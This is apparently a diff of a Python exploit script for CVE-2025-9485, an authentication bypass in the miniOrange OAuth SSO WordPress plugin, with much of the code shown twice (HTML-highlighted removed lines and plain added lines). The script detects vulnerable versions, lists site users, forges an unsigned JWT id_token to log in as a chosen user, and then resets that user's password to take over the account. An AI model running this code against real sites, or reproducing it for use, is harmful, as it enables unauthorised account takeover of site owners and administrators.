-        <span class="pl-k">if</span> <span class="pl-s1">r</span>.<span class="pl-c1">status_code</span> <span class="pl-c1">in</span> (<span class="pl-c1">301</span>, <span class="pl-c1">302</span>, <span class="pl-c1">303</span>, <span class="pl-c1">307</span>, <span class="pl-c1">308</span>) <span class="pl-c1">and</span> <span class="pl-s">"openid-connect/auth"</span> <span class="pl-c1">in</span> <span class="pl-s1">r</span>.<span class="pl-c1">headers</span>.<span class="pl-c1">get</span>(<span class="pl-s">"Location"</span>, <span class="pl-s">""</span>):
-            <span class="pl-k">return</span> <span class="pl-s1">version</span>, <span class="pl-s1">app</span>
-    <span class="pl-k">return</span> <span class="pl-s1">version</span>, <span class="pl-c1">None</span>
+def mkurl(scheme, ip, port, path=&quot;/&quot;):
+    return (f&quot;{scheme}://{ip}&quot; if port in (80, 443) else f&quot;{scheme}://{ip}:{port}&quot;) + path
 
 
-<span class="pl-k">def</span> <span class="pl-en">get_users</span>(<span class="pl-s1">s</span>, <span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>):
-    <span class="pl-k">try</span>:
-        <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-en">mkurl</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s">"/index.php?rest_route=/wp/v2/users"</span>), <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>)
-        <span class="pl-s1">data</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">json</span>()
-        <span class="pl-k">if</span> <span class="pl-en">isinstance</span>(<span class="pl-s1">data</span>, <span class="pl-s1">list</span>):
-            <span class="pl-k">return</span> [<span class="pl-s1">u</span>[<span class="pl-s">"slug"</span>] <span class="pl-k">for</span> <span class="pl-s1">u</span> <span class="pl-c1">in</span> <span class="pl-s1">data</span> <span class="pl-k">if</span> <span class="pl-s1">u</span>.<span class="pl-c1">get</span>(<span class="pl-s">"slug"</span>)]
-    <span class="pl-k">except</span>:
-        <span class="pl-k">pass</span>
-    <span class="pl-k">return</span> []
+def check_vuln(s, scheme, ip, port):
+    body = s.get(mkurl(scheme, ip, port, &quot;/wp-login.php&quot;), timeout=10).text
+    body += s.get(mkurl(scheme, ip, port, &quot;/&quot;), timeout=10).text
+    slug = &quot;miniorange-login-with-eve-online-google-facebook&quot;
+    if slug not in body:
+        return None, None
+    ver = re.findall(slug + r&quot;/[^?]+\?ver=([0-9.]+)&quot;, body)
+    version = max(ver, key=lambda v: tuple(int(x) for x in v.split(&quot;.&quot;))) if ver else None
+    if version and tuple(int(x) for x in version.split(&quot;.&quot;)) &gt;= (6, 26, 13):
+        return version, False
+    apps = list(dict.fromkeys(urllib.parse.unquote(m.group(1)) for m in re.finditer(r&quot;[?&amp;]app_name=([^&amp;'\&quot;&lt;&gt;\s]+)&quot;, body)))
+    for a in [&quot;keycloak&quot;, &quot;openid&quot;, &quot;oauth&quot;]:
+        if a not in apps:
+            apps.append(a)
+    for app in apps:
+        try:
+            r = s.get(mkurl(scheme, ip, port, f&quot;/?option=oauthredirect&amp;app_name={app}&quot;), allow_redirects=False, timeout=10)
+        except:
+            continue
+        if r.status_code in (301, 302, 303, 307, 308) and &quot;openid-connect/auth&quot; in r.headers.get(&quot;Location&quot;, &quot;&quot;):
+            return version, app
+    return version, None
 
 
-<span class="pl-k">def</span> <span class="pl-en">exploit</span>(<span class="pl-s1">s</span>, <span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s1">app</span>, <span class="pl-s1">username</span>, <span class="pl-s1">email</span>):
-    <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-en">mkurl</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s">f"/?option=oauthredirect&amp;app_name=<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">app</span><span class="pl-kos">}</span></span>"</span>), <span class="pl-s1">allow_redirects</span><span class="pl-c1">=</span><span class="pl-c1">False</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>)
-    <span class="pl-s1">loc</span> <span class="pl-c1">=</span> <span class="pl-s1">r</span>.<span class="pl-c1">headers</span>.<span class="pl-c1">get</span>(<span class="pl-s">"Location"</span>, <span class="pl-s">""</span>)
-    <span class="pl-s1">params</span> <span class="pl-c1">=</span> {<span class="pl-s1">k</span>: <span class="pl-s1">v</span>[<span class="pl-c1">0</span>] <span class="pl-k">for</span> <span class="pl-s1">k</span>, <span class="pl-s1">v</span> <span class="pl-c1">in</span> <span class="pl-s1">urllib</span>.<span class="pl-c1">parse</span>.<span class="pl-c1">parse_qs</span>(<span class="pl-s1">urllib</span>.<span class="pl-c1">parse</span>.<span class="pl-c1">urlparse</span>(<span class="pl-s1">loc</span>).<span class="pl-c1">query</span>).<span class="pl-c1">items</span>()}
-    <span class="pl-s1">parsed</span> <span class="pl-c1">=</span> <span class="pl-s1">urllib</span>.<span class="pl-c1">parse</span>.<span class="pl-c1">urlparse</span>(<span class="pl-s1">loc</span>)
-    <span class="pl-s1">realm</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-c1">search</span>(<span class="pl-s">r"/realms/([^/]+)/"</span>, <span class="pl-s1">parsed</span>.<span class="pl-c1">path</span>)
-    <span class="pl-s1">issuer</span> <span class="pl-c1">=</span> <span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">parsed</span>.<span class="pl-c1">scheme</span><span class="pl-kos">}</span></span>://<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">parsed</span>.<span class="pl-c1">netloc</span><span class="pl-kos">}</span></span>/realms/<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">realm</span>.<span class="pl-c1">group</span>(<span class="pl-c1">1</span>)<span class="pl-kos">}</span></span>"</span> <span class="pl-k">if</span> <span class="pl-s1">realm</span> <span class="pl-k">else</span> <span class="pl-s">""</span>
-    <span class="pl-s1">client_id</span>, <span class="pl-s1">nonce</span>, <span class="pl-s1">state</span> <span class="pl-c1">=</span> <span class="pl-s1">params</span>.<span class="pl-c1">get</span>(<span class="pl-s">"client_id"</span>, <span class="pl-s">""</span>), <span class="pl-s1">params</span>.<span class="pl-c1">get</span>(<span class="pl-s">"nonce"</span>, <span class="pl-s">""</span>), <span class="pl-s1">params</span>.<span class="pl-c1">get</span>(<span class="pl-s">"state"</span>, <span class="pl-s">""</span>)
-    <span class="pl-s1">redirect_uri</span> <span class="pl-c1">=</span> <span class="pl-s1">params</span>.<span class="pl-c1">get</span>(<span class="pl-s">"redirect_uri"</span>, <span class="pl-s">"/"</span>)
-    <span class="pl-s1">now</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-s1">time</span>.<span class="pl-c1">time</span>())
-    <span class="pl-s1">claims</span> <span class="pl-c1">=</span> {<span class="pl-s">"iss"</span>: <span class="pl-s1">issuer</span>, <span class="pl-s">"aud"</span>: <span class="pl-s1">client_id</span>, <span class="pl-s">"azp"</span>: <span class="pl-s1">client_id</span>, <span class="pl-s">"sub"</span>: <span class="pl-s">f"f-<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">username</span><span class="pl-kos">}</span></span>-<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">random</span>.<span class="pl-c1">randint</span>(<span class="pl-c1">1000</span>,<span class="pl-c1">9999</span>)<span class="pl-kos">}</span></span>"</span>, <span class="pl-s">"preferred_username"</span>: <span class="pl-s1">username</span>, <span class="pl-s">"email"</span>: <span class="pl-s1">email</span>, <span class="pl-s">"email_verified"</span>: <span class="pl-c1">True</span>, <span class="pl-s">"name"</span>: <span class="pl-s1">username</span>, <span class="pl-s">"iat"</span>: <span class="pl-s1">now</span>, <span class="pl-s">"nbf"</span>: <span class="pl-s1">now</span>, <span class="pl-s">"exp"</span>: <span class="pl-s1">now</span> <span class="pl-c1">+</span> <span class="pl-c1">3600</span>}
-    <span class="pl-k">if</span> <span class="pl-s1">nonce</span>:
-        <span class="pl-s1">claims</span>[<span class="pl-s">"nonce"</span>] <span class="pl-c1">=</span> <span class="pl-s1">nonce</span>
-    <span class="pl-s1">token</span> <span class="pl-c1">=</span> <span class="pl-en">jwt_none</span>(<span class="pl-s1">claims</span>)
-    <span class="pl-s1">cb</span> <span class="pl-c1">=</span> <span class="pl-s1">urllib</span>.<span class="pl-c1">parse</span>.<span class="pl-c1">urlparse</span>(<span class="pl-s1">redirect_uri</span>).<span class="pl-c1">path</span> <span class="pl-c1">or</span> <span class="pl-s">"/"</span>
-    <span class="pl-s1">s</span>.<span class="pl-c1">post</span>(<span class="pl-en">mkurl</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s1">cb</span>), <span class="pl-s1">data</span><span class="pl-c1">=</span>{<span class="pl-s">"id_token"</span>: <span class="pl-s1">token</span>, <span class="pl-s">"state"</span>: <span class="pl-s1">state</span>}, <span class="pl-s1">allow_redirects</span><span class="pl-c1">=</span><span class="pl-c1">False</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>)
-    <span class="pl-k">if</span> <span class="pl-en">any</span>(<span class="pl-s1">n</span>.<span class="pl-c1">startswith</span>(<span class="pl-s">"wordpress_logged_in"</span>) <span class="pl-k">for</span> <span class="pl-s1">n</span> <span class="pl-c1">in</span> <span class="pl-s1">s</span>.<span class="pl-c1">cookies</span>.<span class="pl-c1">get_dict</span>()):
-        <span class="pl-k">return</span> <span class="pl-c1">True</span>
-    <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-en">mkurl</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s1">cb</span> <span class="pl-c1">+</span> <span class="pl-s">"?"</span> <span class="pl-c1">+</span> <span class="pl-s1">urllib</span>.<span class="pl-c1">parse</span>.<span class="pl-c1">urlencode</span>({<span class="pl-s">"id_token"</span>: <span class="pl-s1">token</span>, <span class="pl-s">"state"</span>: <span class="pl-s1">state</span>})), <span class="pl-s1">allow_redirects</span><span class="pl-c1">=</span><span class="pl-c1">False</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>)
-    <span class="pl-k">return</span> <span class="pl-en">any</span>(<span class="pl-s1">n</span>.<span class="pl-c1">startswith</span>(<span class="pl-s">"wordpress_logged_in"</span>) <span class="pl-k">for</span> <span class="pl-s1">n</span> <span class="pl-c1">in</span> <span class="pl-s1">s</span>.<span class="pl-c1">cookies</span>.<span class="pl-c1">get_dict</span>())
+def get_users(s, scheme, ip, port):
+    try:
+        r = s.get(mkurl(scheme, ip, port, &quot;/index.php?rest_route=/wp/v2/users&quot;), timeout=10)
+        data = r.json()
+        if isinstance(data, list):
+            return [u[&quot;slug&quot;] for u in data if u.get(&quot;slug&quot;)]
+    except:
+        pass
+    return []
 
 
-<span class="pl-k">def</span> <span class="pl-en">change_pw</span>(<span class="pl-s1">s</span>, <span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s1">username</span>, <span class="pl-s1">pw</span>):
-    <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">get</span>(<span class="pl-en">mkurl</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s">"/wp-admin/profile.php"</span>), <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>)
-    <span class="pl-k">if</span> <span class="pl-s1">r</span>.<span class="pl-c1">status_code</span> <span class="pl-c1">!=</span> <span class="pl-c1">200</span>:
-        <span class="pl-k">return</span> <span class="pl-c1">False</span>
-    <span class="pl-s1">fields</span> <span class="pl-c1">=</span> {}
-    <span class="pl-k">for</span> <span class="pl-s1">m</span> <span class="pl-c1">in</span> <span class="pl-s1">re</span>.<span class="pl-c1">finditer</span>(<span class="pl-s">r'&lt;input[^&gt;]*name=["\']([^"\']+)["\'][^&gt;]*value=["\']([^"\']*)["\']'</span>, <span class="pl-s1">r</span>.<span class="pl-c1">text</span>, <span class="pl-s1">re</span>.<span class="pl-c1">I</span>):
-        <span class="pl-s1">fields</span>[<span class="pl-s1">m</span>.<span class="pl-c1">group</span>(<span class="pl-c1">1</span>)] <span class="pl-c1">=</span> <span class="pl-s1">html</span>.<span class="pl-c1">unescape</span>(<span class="pl-s1">m</span>.<span class="pl-c1">group</span>(<span class="pl-c1">2</span>))
-    <span class="pl-k">for</span> <span class="pl-s1">m</span> <span class="pl-c1">in</span> <span class="pl-s1">re</span>.<span class="pl-c1">finditer</span>(<span class="pl-s">r'&lt;input[^&gt;]*value=["\']([^"\']*)["\'][^&gt;]*name=["\']([^"\']+)["\']'</span>, <span class="pl-s1">r</span>.<span class="pl-c1">text</span>, <span class="pl-s1">re</span>.<span class="pl-c1">I</span>):
-        <span class="pl-s1">fields</span>[<span class="pl-s1">m</span>.<span class="pl-c1">group</span>(<span class="pl-c1">2</span>)] <span class="pl-c1">=</span> <span class="pl-s1">html</span>.<span class="pl-c1">unescape</span>(<span class="pl-s1">m</span>.<span class="pl-c1">group</span>(<span class="pl-c1">1</span>))
-    <span class="pl-s1">fields</span>.<span class="pl-c1">update</span>({<span class="pl-s">"action"</span>: <span class="pl-s">"update"</span>, <span class="pl-s">"pass1"</span>: <span class="pl-s1">pw</span>, <span class="pl-s">"pass2"</span>: <span class="pl-s1">pw</span>, <span class="pl-s">"pw_weak"</span>: <span class="pl-s">"on"</span>, <span class="pl-s">"submit"</span>: <span class="pl-s">"Update Profile"</span>})
-    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">fields</span>.<span class="pl-c1">get</span>(<span class="pl-s">"display_name"</span>):
-        <span class="pl-s1">fields</span>[<span class="pl-s">"display_name"</span>] <span class="pl-c1">=</span> <span class="pl-s1">username</span>
-    <span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-s1">s</span>.<span class="pl-c1">post</span>(<span class="pl-en">mkurl</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s">"/wp-admin/profile.php"</span>), <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">fields</span>, <span class="pl-s1">allow_redirects</span><span class="pl-c1">=</span><span class="pl-c1">False</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">10</span>)
-    <span class="pl-k">return</span> <span class="pl-s">"updated=1"</span> <span class="pl-c1">in</span> <span class="pl-s1">r</span>.<span class="pl-c1">headers</span>.<span class="pl-c1">get</span>(<span class="pl-s">"Location"</span>, <span class="pl-s">""</span>) <span class="pl-c1">or</span> <span class="pl-s">"updated=true"</span> <span class="pl-c1">in</span> <span class="pl-s1">r</span>.<span class="pl-c1">headers</span>.<span class="pl-c1">get</span>(<span class="pl-s">"Location"</span>, <span class="pl-s">""</span>)
+def exploit(s, scheme, ip, port, app, username, email):
+    r = s.get(mkurl(scheme, ip, port, f&quot;/?option=oauthredirect&amp;app_name={app}&quot;), allow_redirects=False, timeout=10)
+    loc = r.headers.get(&quot;Location&quot;, &quot;&quot;)
+    params = {k: v[0] for k, v in urllib.parse.parse_qs(urllib.parse.urlparse(loc).query).items()}
+    parsed = urllib.parse.urlparse(loc)
+    realm = re.search(r&quot;/realms/([^/]+)/&quot;, parsed.path)
+    issuer = f&quot;{parsed.scheme}://{parsed.netloc}/realms/{realm.group(1)}&quot; if realm else &quot;&quot;
+    client_id, nonce, state = params.get(&quot;client_id&quot;, &quot;&quot;), params.get(&quot;nonce&quot;, &quot;&quot;), params.get(&quot;state&quot;, &quot;&quot;)
+    redirect_uri = params.get(&quot;redirect_uri&quot;, &quot;/&quot;)
+    now = int(time.time())
+    claims = {&quot;iss&quot;: issuer, &quot;aud&quot;: client_id, &quot;azp&quot;: client_id, &quot;sub&quot;: f&quot;f-{username}-{random.randint(1000,9999)}&quot;, &quot;preferred_username&quot;: username, &quot;email&quot;: email, &quot;email_verified&quot;: True, &quot;name&quot;: username, &quot;iat&quot;: now, &quot;nbf&quot;: now, &quot;exp&quot;: now + 3600}
+    if nonce:
+        claims[&quot;nonce&quot;] = nonce
+    token = jwt_none(claims)
+    cb = urllib.parse.urlparse(redirect_uri).path or &quot;/&quot;
+    s.post(mkurl(scheme, ip, port, cb), data={&quot;id_token&quot;: token, &quot;state&quot;: state}, allow_redirects=False, timeout=10)
+    if any(n.startswith(&quot;wordpress_logged_in&quot;) for n in s.cookies.get_dict()):
+        return True
+    s.get(mkurl(scheme, ip, port, cb + &quot;?&quot; + urllib.parse.urlencode({&quot;id_token&quot;: token, &quot;state&quot;: state})), allow_redirects=False, timeout=10)
+    return any(n.startswith(&quot;wordpress_logged_in&quot;) for n in s.cookies.get_dict())
 
 
-<span class="pl-k">def</span> <span class="pl-en">main</span>():
-    <span class="pl-s1">parser</span> <span class="pl-c1">=</span> <span class="pl-s1">argparse</span>.<span class="pl-c1">ArgumentParser</span>(<span class="pl-s1">description</span><span class="pl-c1">=</span><span class="pl-s">"CVE-2025-9485 | miniOrange OAuth Single Sign On &lt; 6.26.13 Authentication Bypass"</span>)
-    <span class="pl-s1">parser</span>.<span class="pl-c1">add_argument</span>(<span class="pl-s">"url"</span>, <span class="pl-s1">help</span><span class="pl-c1">=</span><span class="pl-s">"http://target or target IP"</span>)
-    <span class="pl-s1">args</span> <span class="pl-c1">=</span> <span class="pl-s1">parser</span>.<span class="pl-c1">parse_args</span>()
-
-    <span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span> <span class="pl-c1">=</span> <span class="pl-en">parse_url</span>(<span class="pl-s1">args</span>.<span class="pl-c1">url</span>)
-    <span class="pl-s1">host</span> <span class="pl-c1">=</span> <span class="pl-en">get_wp_host</span>(<span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>)
-    <span class="pl-s1">s</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">Session</span>()
-    <span class="pl-s1">s</span>.<span class="pl-c1">headers</span>.<span class="pl-c1">update</span>({<span class="pl-s">"Host"</span>: <span class="pl-s1">host</span>})
-
-    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">C</span><span class="pl-kos">}</span></span>[*]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> Target: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">B</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">scheme</span><span class="pl-kos">}</span></span>://<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">ip</span><span class="pl-kos">}</span></span>:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">port</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> (Host: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">host</span><span class="pl-kos">}</span></span>)"</span>)
-    <span class="pl-s1">version</span>, <span class="pl-s1">app</span> <span class="pl-c1">=</span> <span class="pl-en">check_vuln</span>(<span class="pl-s1">s</span>, <span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>)
-    <span class="pl-k">if</span> <span class="pl-s1">app</span> <span class="pl-c1">is</span> <span class="pl-c1">None</span>:
-        <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">R</span><span class="pl-kos">}</span></span>[-]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> Not vulnerable. Plugin version: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">version</span> <span class="pl-c1">or</span> <span class="pl-s">'not found'</span><span class="pl-kos">}</span></span>"</span>)
-        <span class="pl-k">return</span>
-    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">G</span><span class="pl-kos">}</span></span>[+]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> Plugin version: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">Y</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">version</span> <span class="pl-c1">or</span> <span class="pl-s">'unknown'</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> | app_name: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">Y</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">app</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span>"</span>)
-    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">G</span><span class="pl-kos">}</span></span>[+]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">R</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">B</span><span class="pl-kos">}</span></span>Vulnerable to CVE-2025-9485<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span>"</span>)
-
-    <span class="pl-s1">users</span> <span class="pl-c1">=</span> <span class="pl-en">get_users</span>(<span class="pl-s1">s</span>, <span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>)
-    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">users</span>:
-        <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">R</span><span class="pl-kos">}</span></span>[-]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> No public users found"</span>)
-        <span class="pl-s1">u</span> <span class="pl-c1">=</span> <span class="pl-en">input</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">Y</span><span class="pl-kos">}</span></span>[?]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> Enter username: "</span>).<span class="pl-c1">strip</span>()
-        <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">u</span>:
-            <span class="pl-k">return</span>
-        <span class="pl-s1">users</span> <span class="pl-c1">=</span> [<span class="pl-s1">u</span>]
-    <span class="pl-k">else</span>:
-        <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">C</span><span class="pl-kos">}</span></span>[*]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> Users: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s">', '</span>.<span class="pl-c1">join</span>(<span class="pl-s1">users</span>)<span class="pl-kos">}</span></span>"</span>)
-        <span class="pl-k">for</span> <span class="pl-s1">i</span>, <span class="pl-s1">u</span> <span class="pl-c1">in</span> <span class="pl-en">enumerate</span>(<span class="pl-s1">users</span>):
-            <span class="pl-en">print</span>(<span class="pl-s">f"  <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">C</span><span class="pl-kos">}</span></span>[<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">i</span><span class="pl-kos">}</span></span>]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">u</span><span class="pl-kos">}</span></span>"</span>)
-        <span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-en">input</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">Y</span><span class="pl-kos">}</span></span>[?]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> Select user [0-<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">len</span>(<span class="pl-s1">users</span>)<span class="pl-c1">-</span><span class="pl-c1">1</span><span class="pl-kos">}</span></span>]: "</span>).<span class="pl-c1">strip</span>()
-        <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">c</span>.<span class="pl-c1">isdigit</span>() <span class="pl-c1">or</span> <span class="pl-en">int</span>(<span class="pl-s1">c</span>) <span class="pl-c1">&gt;=</span> <span class="pl-en">len</span>(<span class="pl-s1">users</span>):
-            <span class="pl-k">return</span>
-        <span class="pl-s1">users</span> <span class="pl-c1">=</span> [<span class="pl-s1">users</span>[<span class="pl-en">int</span>(<span class="pl-s1">c</span>)]]
-
-    <span class="pl-s1">username</span> <span class="pl-c1">=</span> <span class="pl-s1">users</span>[<span class="pl-c1">0</span>]
-    <span class="pl-s1">email</span> <span class="pl-c1">=</span> <span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">username</span><span class="pl-kos">}</span></span>@<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">host</span>.<span class="pl-c1">split</span>(<span class="pl-s">':'</span>)[<span class="pl-c1">0</span>]<span class="pl-kos">}</span></span>"</span>
-    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">C</span><span class="pl-kos">}</span></span>[*]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> Exploiting: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">B</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">username</span><span class="pl-kos">}</span></span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> (<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">email</span><span class="pl-kos">}</span></span>)"</span>)
-
-    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-en">exploit</span>(<span class="pl-s1">s</span>, <span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s1">app</span>, <span class="pl-s1">username</span>, <span class="pl-s1">email</span>):
-        <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">R</span><span class="pl-kos">}</span></span>[-]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> Failed, no login cookie"</span>)
-        <span class="pl-k">return</span>
-    <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">G</span><span class="pl-kos">}</span></span>[+]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">G</span><span class="pl-kos">}</span></span>Auth bypass success!<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span>"</span>)
-
-    <span class="pl-s1">pw</span> <span class="pl-c1">=</span> <span class="pl-en">rand_pw</span>()
-    <span class="pl-k">if</span> <span class="pl-en">change_pw</span>(<span class="pl-s1">s</span>, <span class="pl-s1">scheme</span>, <span class="pl-s1">ip</span>, <span class="pl-s1">port</span>, <span class="pl-s1">username</span>, <span class="pl-s1">pw</span>):
-        <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">G</span><span class="pl-kos">}</span></span>[+]<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">G</span><span class="pl-kos">}</span></span>Password changed!<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span>"</span>)
-        <span class="pl-en">print</span>(<span class="pl-s">f"    <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">B</span><span class="pl-kos">}</span></span>URL:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span>      <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">scheme</span><span class="pl-kos">}</span></span>://<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">host</span><span class="pl-kos">}</span></span>/wp-login.php"</span>)
-        <span class="pl-en">print</span>(<span class="pl-s">f"    <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">B</span><span class="pl-kos">}</span></span>Username:<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-c1">E</span><span class="pl-kos">}</span></span> <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">username</span><span class="pl-kos">}</span></span>"</span>)
